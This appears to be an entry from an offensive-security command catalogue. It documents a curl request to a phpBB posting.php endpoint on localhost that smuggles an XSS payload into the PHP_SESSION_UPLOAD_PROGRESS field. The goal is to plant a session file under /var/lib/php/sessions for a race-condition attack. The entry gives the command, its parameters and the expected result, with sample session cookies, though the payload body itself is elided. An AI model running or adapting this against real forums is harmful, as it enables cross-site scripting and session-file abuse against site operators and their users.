---
data: >-
  curl -X POST "http://127.0.0.1/phpbb/phpBB/posting.php?mode=reply&t=1" -H
  "Content-Type: multipart/form-data;
  boundary=----WebKitFormBoundaryOo7a3KoNwQen5oAC" -H "Cookie:
  csrftoken=Ky6rB5uThxl3PwYd6EScmT9WXYiH6rGe;
  sessionid=hmrhwwo5hj5abu4kqgln2let1x9zudbr;
  phpbb3_cbvpk_sid=3fd08be6c8fc002f417821755ad2ae25; phpbb3_cbvpk_u=2;
  phpbb3_cbvpk_k=; phpbb3_83bmg_u=1; phpbb3_83bmg_k=;
  phpbb3_83bmg_sid=46114d6cd0db772e20e92dc60b68de23;PHPSESSID=shin24"
  --data-binary "------WebKitFormBoundaryOo7a3KoNwQen5oAC\nContent-Disposition:
  form-data; name=\"name\"\n\no_1haltjikorn118h41o27udj19ukb.zip\n... (full
  multipart with PHP_SESSION_UPLOAD_PROGRESS
  payload)\n------WebKitFormBoundaryOo7a3KoNwQen5oAC--"
tags:
  - upload
  - race-condition
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:06.082Z'
id: 8188eb6c-537d-4111-a86f-2fc01c6f09ab
verified: false
validated: true
submitted: true
---
---

# php-race-condition-upload

## Command

```bash
curl -X POST "http://127.0.0.1/phpbb/phpBB/posting.php?mode=reply&t=1" -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOo7a3KoNwQen5oAC" -H "Cookie: csrftoken=Ky6rB5uThxl3PwYd6EScmT9WXYiH6rGe; sessionid=hmrhwwo5hj5abu4kqgln2let1x9zudbr; phpbb3_cbvpk_sid=3fd08be6c8fc002f417821755ad2ae25; phpbb3_cbvpk_u=2; phpbb3_cbvpk_k=; phpbb3_83bmg_u=1; phpbb3_83bmg_k=; phpbb3_83bmg_sid=46114d6cd0db772e20e92dc60b68de23;PHPSESSID=shin24" --data-binary "------WebKitFormBoundaryOo7a3KoNwQen5oAC\nContent-Disposition: form-data; name=\"name\"\n\no_1haltjikorn118h41o27udj19ukb.zip\n... (full multipart with PHP_SESSION_UPLOAD_PROGRESS payload)\n------WebKitFormBoundaryOo7a3KoNwQen5oAC--"
```

## Description

Uploads a dummy file to phpBB posting.php using multipart form, embedding XSS emoji payload in PHP_SESSION_UPLOAD_PROGRESS to create a temp session file for race exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| PHPSESSID | Cookie to name sess file (e.g., shin24) | Yes |
| PHP_SESSION_UPLOAD_PROGRESS | Field with XSS payload | Yes |
| fileupload | Dummy zip content | Yes |

## Examples

### Basic Usage

```bash
curl ... (as above)
```

## Expected Output

Upload response; creates /var/lib/php/sessions/sess_shin24 with payload.

## Related

- [[Related Procedure: Exploit-Race-Condition-for-XSS-Import]]
